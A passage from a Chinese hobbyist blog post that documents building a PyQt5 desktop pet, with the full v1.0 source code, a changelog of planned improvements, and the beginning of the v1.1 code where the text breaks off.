    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/13/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/13/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91/" class="post-title-link" itemprop="url">不务正业系列：桌宠开发（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-13 00:59:37" itemprop="dateCreated datePublished" datetime="2022-04-13T00:59:37+08:00">2022-04-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-13 18:13:16" itemprop="dateModified" datetime="2022-05-13T18:13:16+08:00">2022-05-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>38k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>34 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="桌宠开发"><a href="#桌宠开发" class="headerlink" title="桌宠开发"></a>桌宠开发</h2><p>最近在学习 Python 一直想搞一个项目</p>
<p>爬虫之后我又盯上桌宠了（主要是想把爬虫搭载到桌宠上），经典不务正业</p>
<h2 id="DesktopPets-v1-0"><a href="#DesktopPets-v1-0" class="headerlink" title="DesktopPets_v1.0"></a>DesktopPets_v1.0</h2><p>第一个桌宠是在网上抄的，主要是为了熟悉 PyQt5 的使用</p>
<p>这个桌宠的功能很弱，之后的版本都会在它的基础上进行修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtWidgets, QtGui</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>) <span class="comment"># 获取图片的路径</span></span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>], <span class="comment"># 行走</span></span><br><span class="line">        [<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;11&#x27;</span>], <span class="comment"># 坠落&amp;拖动</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>, <span class="string">&#x27;16&#x27;</span>, <span class="string">&#x27;17&#x27;</span>], <span class="comment"># 攻击1</span></span><br><span class="line">        [<span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;19&#x27;</span>], <span class="comment"># 摔倒</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>], <span class="comment"># 飞</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;25&#x27;</span>], <span class="comment"># 举手</span></span><br><span class="line">        [<span class="string">&#x27;26&#x27;</span>, <span class="string">&#x27;27&#x27;</span>, <span class="string">&#x27;28&#x27;</span>, <span class="string">&#x27;29&#x27;</span>], <span class="comment"># 攻击2</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;31&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;33&#x27;</span>], <span class="comment"># 坐2</span></span><br><span class="line">        [<span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;37&#x27;</span>], <span class="comment"># 攻击3</span></span><br><span class="line">        [<span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;46&#x27;</span>] <span class="comment"># 杂项</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">5</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i: ACTION_DISTRIBUTION&#125;) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        <span class="comment"># 初始化</span></span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        <span class="comment"># 随机导入一个宠物</span></span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        <span class="comment"># 设置退出选项</span></span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quit)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        <span class="comment"># 当前显示的图片</span></span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 是否跟随鼠标</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 宠物拖拽时避免鼠标直接跳到左上角</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        <span class="comment"># 显示</span></span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.show()</span><br><span class="line">        <span class="comment"># 宠物动画动作执行所需的一些变量</span></span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 每隔一段时间做个动作</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(self.randomAct)</span><br><span class="line">        self.timer.start(<span class="number">500</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action_images = random.choice(self.pet_images)</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.runFrame()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer])</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            pet_images.append([self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action])</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime1.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左键按下时, 宠物将和鼠标位置绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quit</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v1.0</li>
<li>date：2022.3.31</li>
<li>type：<ul>
<li>Features：NULL</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>第一代版本，功能很弱，急需解决的问题有：<ul>
<li>动作不连贯</li>
<li>角色不会移动</li>
<li>角色只能面向单一方向</li>
<li>缺少互动性</li>
<li>缺少“重力系统”</li>
<li>缺少右键菜单选项</li>
<li>缺少对话功能</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="DesktopPets-v1-1"><a href="#DesktopPets-v1-1" class="headerlink" title="DesktopPets_v1.1"></a>DesktopPets_v1.1</h2><p>在 DesktopPets_v1.0 的基础上进行了面积升级</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtWidgets, QtGui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;x&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>], <span class="comment"># 坠落&amp;拖动1_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;19&#x27;</span>], <span class="comment"># 摔倒_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 飞_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>, <span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span 